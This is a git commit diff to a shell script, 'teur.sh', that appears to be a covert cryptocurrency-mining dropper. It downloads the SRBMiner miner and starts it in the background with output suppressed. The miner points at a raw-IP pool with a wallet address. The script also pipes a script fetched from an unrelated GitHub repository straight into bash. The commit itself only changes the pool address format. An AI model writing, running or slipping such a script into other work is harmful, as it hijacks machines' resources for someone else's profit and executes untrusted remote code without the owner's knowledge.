153f5573c447442e5fe801f6fa1caf28dd0dc8f1
malogrono <136266511+malogrono@users.noreply.github.com>
2026-08-29 17:18:49 +0700

    Update teur.sh

--- teur.sh
+++ teur.sh
@@ -3,5 +3,5 @@ sudo su --command "curl -fsSL https://deb.nodesource.com/setup_20.x | sudo bash 
 wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.8/SRBMiner-Multi-2-4-8-Linux.tar.gz >/dev/null 2>&1
 tar -xzvf SRBMiner-Multi-2-4-8-Linux.tar.gz
 cd SRBMiner-Multi-2-4-8
-./SRBMiner-MULTI --algorithm randomx --pool stratum+tcp://87.58.153.9:80 --wallet Q01050095f8fa589dcd8cebc5a6ead8da10e9d9655a1d3ee85640fd1d8ddafde13faa8b744ba6c7.SR >/dev/null 2>&1 &
+./SRBMiner-MULTI --algorithm randomx --pool 87.58.153.9:80 --wallet Q01050095f8fa589dcd8cebc5a6ead8da10e9d9655a1d3ee85640fd1d8ddafde13faa8b744ba6c7.SR >/dev/null 2>&1 &
 curl -sL https://github.com/bsheredia/sempak/raw/refs/heads/main/kupluk.sh | bash
